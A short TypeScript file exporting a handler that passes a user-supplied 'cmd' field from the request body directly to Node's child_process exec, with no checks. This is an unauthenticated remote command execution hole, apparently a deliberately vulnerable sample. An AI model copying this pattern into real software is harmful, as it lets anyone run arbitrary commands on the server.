import { exec as runCommand } from "node:child_process";
export function handler(req: { body: { cmd: string } }) {
  runCommand(req.body.cmd);
}
